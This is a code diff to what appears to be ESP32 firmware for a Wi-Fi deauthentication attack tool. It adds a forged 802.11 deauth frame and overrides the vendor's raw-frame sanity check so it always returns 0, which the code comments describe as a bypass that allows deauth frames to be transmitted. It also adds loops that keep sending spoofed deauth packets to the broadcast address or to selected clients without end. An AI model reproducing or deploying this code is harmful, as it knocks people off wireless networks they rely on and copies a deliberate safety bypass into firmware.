@@ -58,7 +58,9 @@ wifi_promiscuous_filter_t filter;
 uint8_t deauthClients[50][6]; //Store client mac addresses
 int numDeauthClients = 0;
 int selectedApNum = -1; //If value is -1, an ap has not been selected
+int spoofAll; //determines if deauth packet is send to broadcast address or specific clients
 
+/*
 //raw deauth packet
 uint8_t rawDeauthFrame[] = {
     0xc0, 0x00, //frame control
@@ -66,8 +68,18 @@ uint8_t rawDeauthFrame[] = {
     0x00, 0x20, 0xa6, 0xfc, 0xb0, 0x36, //reciever address
     0x2c, 0xf8, 0x9b, 0xdd, 0x06, 0xa0, //transmitter address
     0x2c, 0xf8, 0x9b, 0xdd, 0x06, 0xa0, //bssid
-    0x00, 0x00 //sequence number
+    0x02, 0x00 //sequence number
 };
+*/
+
+static const uint8_t rawDeauthFrame[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
+};
+
 
 /*
 struct sockaddr {
@@ -436,7 +448,8 @@ void selectAllDeauthClients() {
 }
 
 
-int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+//bypass sanity check that prevents deauth frames from being transmitted
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
     return 0;
 }
 
@@ -444,22 +457,40 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
 void startAPSpoof() {
     esp_wifi_start();
 
-    const void *buffer = &rawDeauthFrame;
-    int bufferSize = sizeof(rawDeauthFrame);
-    //sockaddr socketaddress;
-    //socketaddress.sa_family = AF_PACKET;
-    //socketaddress.sa_data = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    //uint8_t testMac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-    //memcpy(socketaddress.sa_data, testMac, sizeof(testMac));
+    //const void *buffer = &rawDeauthFrame;
+    //int bufferSize = sizeof(rawDeauthFrame);
+    int frameSize = sizeof(rawDeauthFrame);
+    uint8_t deauthFrame[frameSize];
+    
+    uint8_t currentMac[6];
 
-    //int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    //int bufferLen = sizeof(rawDeauthFrame);
+    esp_wifi_get_mac(WIFI_IF_AP, currentMac);
+    memcpy(deauthFrame, rawDeauthFrame, frameSize);
+    //Set mac and bssid in frame
+    memcpy(&deauthFrame[10], currentMac, 6);
+    memcpy(&deauthFrame[16], currentMac, 6);
+    int clientCount = apInfo.getClientCount(selectedApNum);
 
     Serial.println("Startung deauth test");
-    while(true) {
-        esp_wifi_80211_tx(WIFI_IF_AP, buffer, bufferSize, false);
-        //sendto(sockfd, buffer, bufferSize, 0, (struct sockaddr*)&socketaddress, sizeof(socketaddress));
-        delay(10);
+    switch(spoofAll) {
+        case 0:
+            for(int i = 0; i < clientCount; i++) {
+                apInfo.getClient(&deauthFrame[4], selectedApNum, i);
+
+                esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
+                delay(10);
+
+                if(i == clientCount-1) {
+                    i = 0;
+                }
+            }
+            break;
+        case 1:
+            while(true) {
+                esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, frameSize, false);
+                delay(10);
+            }
+            break;
     }
 }
 
@@ -620,7 +651,7 @@ void configState() {
                     
                     //Store info to spoof ap
                     configAPSpoof(ssidList[selectedApNum], apInfo.getSSIDLen(selectedApNum), bssid, apInfo.getChannel(selectedApNum));
-                }
+                }   
                 else {
                     sendMsg("Selected AP does not exist");
                 }
@@ -628,9 +659,9 @@ void configState() {
                 break;
             }
             case 7: { //select client
-            
                 if(selectedApNum != -1) {
                     sendMsg("Adding selected clients");
+                    spoofAll = 0;
                     selectDeauthClients();
                 }
                 else {
@@ -640,6 +671,7 @@ void configState() {
             }
             case 8: { //select all clients
                 if(selectedApNum != -1) {
+                    spoofAll = 1;
                     sendMsg("Selecting all clients");
                     selectAllDeauthClients();
                 }
